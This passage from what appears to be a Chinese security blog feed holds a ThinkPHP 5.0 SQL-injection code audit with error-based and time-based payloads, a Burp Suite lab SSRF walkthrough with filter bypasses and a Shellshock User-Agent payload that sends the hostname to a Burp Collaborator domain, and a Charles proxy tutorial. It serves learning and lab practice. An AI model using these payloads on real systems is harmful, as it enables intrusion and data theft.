class="line">            <span class="variable">$options</span>[<span class="string">&#x27;data&#x27;</span>] = <span class="variable">$data</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;trigger(<span class="string">&#x27;after_insert&#x27;</span>, <span class="variable">$options</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$getLastInsID</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$lastInsId</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>tp的insert方法会将得到数组数据放入builder类的insert方法生成sql语句。</p><h3 id="builder类的insert-方法则调用了parseDate-函数："><a href="#builder类的insert-方法则调用了parseDate-函数：" class="headerlink" title="builder类的insert()方法则调用了parseDate()函数："></a>builder类的insert()方法则调用了parseDate()函数：</h3><p><img src="2.2.png" alt="2.2"></p><p>所以确定输入点为tp框架的insert方法。</p><p>后面测试update()方法也能触发该漏洞，username[0]=inc和dec都可以。</p><p>所以流程为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">tp框架insert()--&gt;builder类insert()--&gt;builder类parseDate()</span><br><span class="line"></span><br><span class="line">parseDate函数处理数组[0]=dec或inc时：会将数组[1]和数组[2]拼接</span><br><span class="line">拼接返回的sql语句最终在tp框架insert方法中执行</span><br></pre></td></tr></table></figure><h2 id="3-构造paylaod"><a href="#3-构造paylaod" class="headerlink" title="3.构造paylaod:"></a>3.构造paylaod:</h2><h3 id="parseDate（）方法"><a href="#parseDate（）方法" class="headerlink" title="parseDate（）方法"></a>parseDate（）方法</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">parseData</span>(<span class="params"><span class="variable">$data</span>, <span class="variable">$options</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"><span class="comment">//        data数据为空则赋值为空数组</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$data</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> [];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取绑定信息</span></span><br><span class="line">        <span class="variable">$bind</span> = <span class="keyword">$this</span>-&gt;query-&gt;getFieldsBind(<span class="variable">$options</span>[<span class="string">&#x27;table&#x27;</span>]);</span><br><span class="line">        <span class="keyword">if</span> (<span class="string">&#x27;*&#x27;</span> == <span class="variable">$options</span>[<span class="string">&#x27;field&#x27;</span>]) &#123;</span><br><span class="line">            <span class="variable">$fields</span> = array_keys(<span class="variable">$bind</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$fields</span> = <span class="variable">$options</span>[<span class="string">&#x27;field&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$result</span> = [];</span><br><span class="line"></span><br><span class="line"><span class="comment">//       循环处理data数组的值，将data数组的值存入val数组</span></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$data</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$val</span>) &#123;</span><br><span class="line">            <span class="variable">$item</span> = <span class="keyword">$this</span>-&gt;parseKey(<span class="variable">$key</span>, <span class="variable">$options</span>);</span><br><span class="line"><span class="comment">//            如果是一个对象且存在__toString()函数，则赋值为toString的值</span></span><br><span class="line">            <span class="keyword">if</span> (is_object(<span class="variable">$val</span>) &amp;&amp; method_exists(<span class="variable">$val</span>, <span class="string">&#x27;__toString&#x27;</span>)) &#123;</span><br><span class="line">                <span class="comment">// 对象数据写入</span></span><br><span class="line">                <span class="variable">$val</span> = <span class="variable">$val</span>-&gt;__toString();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="literal">false</span> === strpos(<span class="variable">$key</span>, <span class="string">&#x27;.&#x27;</span>) &amp;&amp; !in_array(<span class="variable">$key</span>, <span class="variable">$fields</span>, <span class="literal">true</span>)) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="variable">$options</span>[<span class="string">&#x27;strict&#x27;</span>]) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&#x27;fields not exists:[&#x27;</span> . <span class="variable">$key</span> . <span class="string">&#x27;]&#x27;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">elseif</span> (is_null(<span class="variable">$val</span>)) &#123;</span><br><span class="line">              </span><br><span class="line">              <span class="variable">$result</span>[<span class="variable">$item</span>] = <span class="string">&#x27;NULL&#x27;</span>;</span><br><span class="line"></span><br><span class="line">                <span class="comment">/***************重点***************/</span></span><br><span class="line">                <span class="comment">//输入的数组值不为空，则检查数组[0]是否为exp,inc,dec ，如果是inc与dec则进行拼接</span></span><br><span class="line">                <span class="comment">//拼接方式为：值1.+.值二</span></span><br><span class="line">                <span class="comment">/*所以此时构造的payloaf为数组</span></span><br><span class="line"><span class="comment">                arr[0]=inc&amp;arr[1]=exp&amp;arr[2]=exp</span></span><br><span class="line"><span class="comment">                */</span></span><br><span class="line">            &#125; <span class="keyword">elseif</span> (is_array(<span class="variable">$val</span>) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$val</span>)) &#123;</span><br><span class="line">                <span class="keyword">switch</span> (<span class="variable">$val</span>[<span class="number">0</span>]) &#123;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">&#x27;exp&#x27;</span>:</span><br><span class="line">                        <span class="variable">$result</span>[<span class="variable">$item</span>] = <span class="variable">$val</span>[<span class="number">1</span>];</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">&#x27;inc&#x27;</span>:</span><br><span class="line">                    <span class="comment">/*floatval为获取变量的浮点值*/</span></span><br><span class="line">                        <span class="variable">$result</span>[<span class="variable">$item</span>] = <span class="keyword">$this</span>-&gt;parseKey(<span class="variable">$val</span>[<span class="number">1</span>]) . <span class="string">&#x27;+&#x27;</span> . floatval(<span class="variable">$val</span>[<span class="number">2</span>]);</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">&#x27;dec&#x27;</span>:</span><br><span class="line">                        <span class="variable">$result</span>[<span class="variable">$item</span>] = <span class="keyword">$this</span>-&gt;parseKey(<span class="variable">$val</span>[<span class="number">1</span>]) . <span class="string">&#x27;-&#x27;</span> . floatval(<span class="variable">$val</span>[<span class="number">2</span>]);</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">elseif</span> (is_scalar(<span class="variable">$val</span>)) &#123;</span><br><span class="line">                <span class="comment">// 过滤非标量数据</span></span><br><span class="line">                <span class="keyword">if</span> (<span class="number">0</span> === strpos(<span class="variable">$val</span>, <span class="string">&#x27;:&#x27;</span>) &amp;&amp; <span class="keyword">$this</span>-&gt;query-&gt;isBind(substr(<span class="variable">$val</span>, <span class="number">1</span>))) &#123;</span><br><span class="line">                    <span class="variable">$result</span>[<span class="variable">$item</span>] = <span class="variable">$val</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="variable">$key</span> = str_replace(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;_&#x27;</span>, <span class="variable">$key</span>);</span><br><span class="line">                    <span class="keyword">$this</span>-&gt;query-&gt;bind(<span class="string">&#x27;data__&#x27;</span> . <span class="variable">$key</span>, <span class="variable">$val</span>, <span class="keyword">isset</span>(<span class="variable">$bind</span>[<span class="variable">$key</span>]) ? <span class="variable">$bind</span>[<span class="variable">$key</span>] : PDO::PARAM_STR);</span><br><span class="line">                    <span class="variable">$result</span>[<span class="variable">$item</span>] = <span class="string">&#x27;:data__&#x27;</span> . <span class="variable">$key</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3 id="根据parseData方法得到payload必须满足的条件："><a href="#根据parseData方法得到payload必须满足的条件：" class="headerlink" title="根据parseData方法得到payload必须满足的条件："></a>根据parseData方法得到payload必须满足的条件：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入值为数组，</span><br><span class="line">payload格式为：arr[0]=inc&amp;arr[1]=exp&amp;arr[2]=数字</span><br></pre></td></tr></table></figure><p>因为是insert注入，所以采用报错注入的方式，构造payload为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arr[0]=inc&amp;arr[1]=updatexml(0x7e,user(),0x7e)&amp;arr[2]=1</span><br></pre></td></tr></table></figure><p>此时需要找一个payload输入点，insert注册功能处就有。</p><h3 id="简单写一个注册demo"><a href="#简单写一个注册demo" class="headerlink" title="简单写一个注册demo:"></a>简单写一个注册demo:</h3><p>tp5.0.1/application/index/controller/Register.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">index</span>\<span class="title">controller</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">app</span>\<span class="title">index</span>\<span class="title">model</span>\<span class="title">Users</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">View</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Controller</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Register</span> <span class="keyword">extends</span> <span class="title">Controller</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$view</span> = <span class="keyword">new</span> View();</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$view</span>-&gt;fetch(<span class="string">&#x27;index&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">register</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="comment">//实例化User</span></span><br><span class="line">        <span class="variable">$user</span> = <span class="keyword">new</span> Users();</span><br><span class="line">        <span class="comment">//接收前端表单提交的数据</span></span><br><span class="line"></span><br><span class="line">        <span class="variable">$user</span>-&gt;username = input(<span class="string">&#x27;post.username&#x27;</span>);</span><br><span class="line">        <span class="variable">$user</span>-&gt;sex = input(<span class="string">&#x27;post.sex&#x27;</span>);</span><br><span class="line">        <span class="variable">$user</span>-&gt;password = input(<span class="string">&#x27;post.password&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$result</span>=<span class="keyword">array</span>(</span><br><span class="line"></span><br><span class="line">            <span class="string">&quot;username&quot;</span>=&gt;<span class="variable">$user</span>-&gt;username,</span><br><span class="line">            <span class="string">&quot;sex&quot;</span>=&gt;<span class="variable">$user</span>-&gt;sex,</span><br><span class="line">            <span class="string">&quot;password&quot;</span>=&gt;<span class="variable">$user</span>-&gt;password</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        db(<span class="string">&#x27;users&#x27;</span>)-&gt;insert(<span class="variable">$result</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Update success&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>tp5.0.1/application/index/view/register/index.html</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;注册&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;div id=&quot;regist_form&quot;&gt;</span><br><span class="line">    &lt;dl&gt;</span><br><span class="line">        &lt;form action=&quot;/tp5.0.1/public/index.php/index/register/register&quot; method=&quot;post&quot;&gt;</span><br><span class="line">                &lt;h1&gt;注册页面&lt;/h1&gt;</span><br><span class="line"></span><br><span class="line">                &lt;p&gt;用户名:&lt;input type=&quot;text&quot; name=&quot;username&quot;&gt;&lt;/p&gt;</span><br><span class="line">                &lt;p&gt;性别:&lt;input type=&quot;text&quot; name=&quot;sex&quot;&gt;&lt;/p&gt;</span><br><span class="line">                &lt;p&gt;密码:&lt;input type=&quot;text&quot; name=&quot;password&quot;&gt;&lt;/p&gt;</span><br><span class="line"></span><br><span class="line">                &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Submit&quot;&gt;</span><br><span class="line"></span><br><span class="line">        &lt;/form&gt;</span><br><span class="line">    &lt;/dl&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>发现在接受数据处必须要这样写：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$user</span>-&gt;username = input(<span class="string">&#x27;post.username/a&#x27;</span>);</span><br></pre></td></tr></table></figure><p>才能触发注入…..可是大多数时候程序员都不会这样写吧，直接接收一个数组….</p><p>/a修饰符官方解释：</p><p><img src="3.2.png" alt="3.2"></p><p>添加/a尝试提交数据注入尝试：</p><h3 id="直接对注册接口提交payload"><a href="#直接对注册接口提交payload" class="headerlink" title="直接对注册接口提交payload"></a>直接对注册接口提交payload</h3><p><img src="3.3.png" alt="3.2"></p><p>感觉这个漏洞比较鸡肋必须要满足用户接收一个数组输入时才能触发，一般的功能点也不会这样写，但是也不一定吧，遇到的时候可以多尝试。</p><h3 id="在debug没开启时可以通过时间盲注的形式获取数据，paylaod"><a href="#在debug没开启时可以通过时间盲注的形式获取数据，paylaod" class="headerlink" title="在debug没开启时可以通过时间盲注的形式获取数据，paylaod:"></a>在debug没开启时可以通过时间盲注的形式获取数据，paylaod:</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?username[<span class="number">0</span>]<span class="operator">=</span>inc<span class="operator">&amp;</span>username[<span class="number">1</span>]<span class="operator">=</span>sleep(<span class="number">5</span>)<span class="operator">&amp;</span>username[<span class="number">2</span>]<span class="operator">=</span><span class="number">1</span></span><br><span class="line"></span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">8888</span><span class="operator">/</span>tp5<span class="number">.0</span><span class="number">.1</span><span class="operator">/</span>public<span class="operator">/</span>index.php<span class="operator">/</span>index<span class="operator">/</span>index<span class="operator">/</span>?username[<span class="number">0</span>]<span class="operator">=</span>inc<span class="operator">&amp;</span>username[<span class="number">1</span>]<span class="operator">=</span>If(ascii(substr(database(),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">115</span>,<span class="number">1</span>,sleep(<span class="number">3</span>))<span class="operator">&amp;</span>username[<span class="number">2</span>]<span class="operator">=</span><span class="number">1</span></span><br></pre></td></tr></table></figure><h2 id="4-官方修复原理"><a href="#4-官方修复原理" class="headerlink" title="4.官方修复原理"></a>4.官方修复原理</h2><p>输入的val[1]必须和字段值相等才会进行拼接，字段值不可能为paylaod:updatexml(0x7e,user(),0x7e);等注入语句，也就修复了注入问题。</p><p><img src="4.2.png" alt="4.2"></p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> thinkphp sql注入 </tag>
            
            <tag> Thinkphp 5.0.15 SQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>burpsuite实验室ssrf通关记录</title>
      <link href="/2019/07/05/burpsuite%E5%AE%9E%E9%AA%8C%E5%AE%A4ssrf%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/"/>
      <url>/2019/07/05/burpsuite%E5%AE%9E%E9%AA%8C%E5%AE%A4ssrf%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h2 id="1-针对本地服务器的基本SSRF"><a href="#1-针对本地服务器的基本SSRF" class="headerlink" title="1.针对本地服务器的基本SSRF"></a>1.针对本地服务器的基本SSRF</h2><p>库存查询按钮处，点击时会将url作为参数进行查询</p><p><img src="1.1.png" alt="1.1"></p><p>访问：<a href="http://localhost/">http://localhost</a></p><p>发现存在/admin目录</p><p><img src="1.2.png" alt="1.2"></p><p>访问：<a href="http://localhost/admin">http://localhost/admin</a></p><p>发现存在删除用户接口</p><p><img src="1.3.png" alt="1.3"></p><p>访问：<a href="http://localhost/admin/delete?username=wiener%E5%8D%B3%E5%8F%AF%E5%88%A0%E9%99%A4%E7%94%A8%E6%88%B7">http://localhost/admin/delete?username=wiener即可删除用户</a></p><h2 id="2-针对另一个后端系统的基本SSRF"><a href="#2-针对另一个后端系统的基本SSRF" class="headerlink" title="2.针对另一个后端系统的基本SSRF"></a>2.针对另一个后端系统的基本SSRF</h2><p>利用ssrf进行内网探测</p><p>使用bp intruder爆破内网8080端口，得到一个和其他访问不一样的status。说明该ip8080端口存在服务</p><p><img src="2.1.png" alt="2.1"></p><p>访问admin目录</p><p><img src="2.2.png" alt="2.2"></p><p>发现删除用户的连接</p><p>访问：<a href="http://192.168.0.122:8080/admin/delete?username=carlos">http://192.168.0.122:8080/admin/delete?username=carlos</a></p><p>即可删除carlos用户</p><h2 id="3-具有基于黑名单的输入过滤器的SSRF"><a href="#3-具有基于黑名单的输入过滤器的SSRF" class="headerlink" title="3.具有基于黑名单的输入过滤器的SSRF"></a>3.具有基于黑名单的输入过滤器的SSRF</h2><p>黑名单过滤了：</p><p>127.0.0.1 和localhost</p><ol><li>可以使用代替ip进行绕过：</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">例如2130706433，017700000001，或127.1</span><br></pre></td></tr></table></figure><ol start="2"><li>注册域名，解析为127.0.0.1</li></ol><p>burp提供的spoofed.burpcollaborator.net即可解析为127.0.0.1</p><p><img src="3.1.png" alt="3.1"></p><p>访问：<a href="http://spoofed.burpcollaborator.net/">http://spoofed.burpcollaborator.net</a></p><p><img src="3.2.png" alt="3.2"></p><p>访问：/admin，发现admin在黑名单中，这里可以采用大小写和url编码绕过（这里需要进行两次编码，因为bp发出时进行了一次解码，服务器再发出时又进行了一次解码）</p><p><img src="3.3.png" alt="3.3"></p><p>发现用户删除链接，访问<a href="http://spoofed.burpcollaborator.net/%25%36%31%25%36%34%25%36%64%25%36%39%25%36%65//admin/delete?username=%5Bcarlos%5D(http://192.168.0.122:8080/admin/delete?username=carlos)%E5%8D%B3%E5%8F%AF%E5%88%A0%E9%99%A4">http://spoofed.burpcollaborator.net/%25%36%31%25%36%34%25%36%64%25%36%39%25%36%65//admin/delete?username=[carlos](http://192.168.0.122:8080/admin/delete?username=carlos)即可删除</a></p><h2 id="4-具有基于白名单的输入过滤器的SSRF"><a href="#4-具有基于白名单的输入过滤器的SSRF" class="headerlink" title="4.具有基于白名单的输入过滤器的SSRF"></a>4.具有基于白名单的输入过滤器的SSRF</h2><p>ssrf访问：<a href="http://localhost/">http://localhost</a></p><p>报错并，提示只能访问stock.weliketoshop.net</p><p>此时尝试绕过该白名单限制：</p><p>最终看了wp才发现绕过方式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost%2523@stock.weliketoshop.net</span><br></pre></td></tr></table></figure><p>@前面的url编码时二次编码的#</p><p>访问：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost%2523@stock.weliketoshop.net/admin/delete?username=carlos</span><br></pre></td></tr></table></figure><h2 id="5-带外检测的盲SSRF"><a href="#5-带外检测的盲SSRF" class="headerlink" title="5.带外检测的盲SSRF"></a>5.带外检测的盲SSRF</h2><p>更具提示：网页会在加载产品页面时获取Referer标头中指定的URL</p><p>更改referer标头为burp collaborator客户端网址</p><p><img src="5.1.png" alt="5.1"></p><p>发送请求：</p><p>burp collaborator客户端收到请求，证明存在漏洞</p><p><img src="5.2.png" alt="5.2"></p><h2 id="6-使用Shellshock进行盲SSRF"><a href="#6-使用Shellshock进行盲SSRF" class="headerlink" title="6.使用Shellshock进行盲SSRF"></a>6.使用Shellshock进行盲SSRF</h2><p>发现无法回显的ssrf。获取敏感信息证明危害：</p><p>首先安装：Collaborator Everywhere插件</p><p>然后将攻击的域名设置到范围中，这样Collaborator Everywhere才能对流量进行修改</p><p><img src="6.1.png" alt="6.1"></p><p>再次抓包：</p><p><img src="6.2.png" alt="6.2"></p><p>Collaborator Everywhere已经添加了许多Shellshock paylod</p><p>对目标内网进行探测，并获取主机名：</p><p>更改user-agent为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">() &#123; :; &#125;; /usr/bin/nslookup $(whoami).t60giu97fmygladioymhxtjyxp3fr4.burpcollaborator.net</span><br></pre></td></tr></table></figure><p>将域名更改为Burp Collaborator中的域名</p><p>更改Referer为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Referer: http://192.168.0.§1§:8080</span><br></pre></td></tr></table></figure><p>对内网服务进行探测。点击开始攻击。几秒之后机会返回内网机器dns查询，并带上自己的主机名</p><p><img src="6.3.png" alt="6.3"></p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ssrf漏洞 </tag>
            
            <tag> burpsuite实验室 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>clarles使用教程</title>
      <link href="/2019/07/05/clarles%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/"/>
      <url>/2019/07/05/clarles%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<h2 id="1-安装ssl证书"><a href="#1-安装ssl证书" class="headerlink" title="1.安装ssl证书"></a>1.安装ssl证书</h2><p>帮助–&gt; ssl 代理 –&gt;安装cha rles根证书</p><p><img src="/Users/h11ba1/Desktop/markdown/%E5%8D%9A%E5%AE%A2/clarles%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/2.1.png" alt="2.1"></p><p>选择安装之后，还需要在mac钥匙串里找到证书将证书设置为始终信任</p><p><img src="2.2.png" alt="2.2"></p><h2 id="2-过滤特定域名"><a href="#2-过滤特定域名" class="headerlink" title="2.过滤特定域名"></a>2.过滤特定域名</h2><h3 id="方法1-filter过滤"><a href="#方法1-filter过滤" class="headerlink" title="方法1:filter过滤"></a>方法1:filter过滤</h3><p><img src="1.1.png" alt="1.1"></p><h3 id="方法二：设置重点关注域名"><a href="#方法二：设置重点关注域名" class="headerlink" title="方法二：设置重点关注域名"></a>方法二：设置重点关注域名</h3><p>选择需要重点关注的域名，鼠标右键选择重点（focused）</p><p>选中的域名就在查看（view)–&gt;重点主机（focused Hosts）中。</p><p><img src="1.2.png" alt="1.2"></p><p>选择重点之后,选择的域名就会出现在最上面，其他域名会折叠在other hosts里，方便查看。</p><p><img src="/Users/h11ba1/Desktop/markdown/%E5%8D%9A%E5%AE%A2/clarles%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/1.3.png" alt="1.3"></p><h2 id="3-乱码解决"><a href="#3-乱码解决" class="headerlink" title="3.乱码解决"></a>3.乱码解决</h2><p>一开始抓包可能会乱码，需要在代理中设置：ssl代理设置为*：443允许抓取ssl数据包。</p><p><img src="3.1.png" alt="3.1"></p><h2 id="4-数据包更改"><a href="#4-数据包更改" class="headerlink" title="4.数据包更改"></a>4.数据包更改</h2><p>选中需要更改的数据包，右键撰写，即可对数据包进行编辑，并且进行请求</p><p><img src="4.1.png" alt="4.1"></p><h2 id="5-数据包并发重放"><a href="#5-数据包并发重放" class="headerlink" title="5.数据包并发重放"></a>5.数据包并发重放</h2><p>数据包并发请求在挖掘逻辑漏洞时有奇效。</p><p>鼠标右键选中需要重放的数据包，选择高级重复。</p><p><img src="5.1.png" alt="5.1"></p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> m1抓包 </tag>
            
            <tag> m1 clarles </tag>
            
            <tag> ios m1 app 抓包 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>burpsuite实验室xxe漏洞通关及知识点讲解</title>
      <link href="/2019/07/05/burpsuite%E5%AE%9E%E9%AA%8C%E5%AE%A4xxe%E6%BC%8F%E6%B4%9E%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/"/>
      <url>/2019/07/05/burpsuite%E5%AE%9E%E9%AA%8C%E5%AE%A4xxe%E6%BC%8F%E6%B4%9E%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/</url>
      
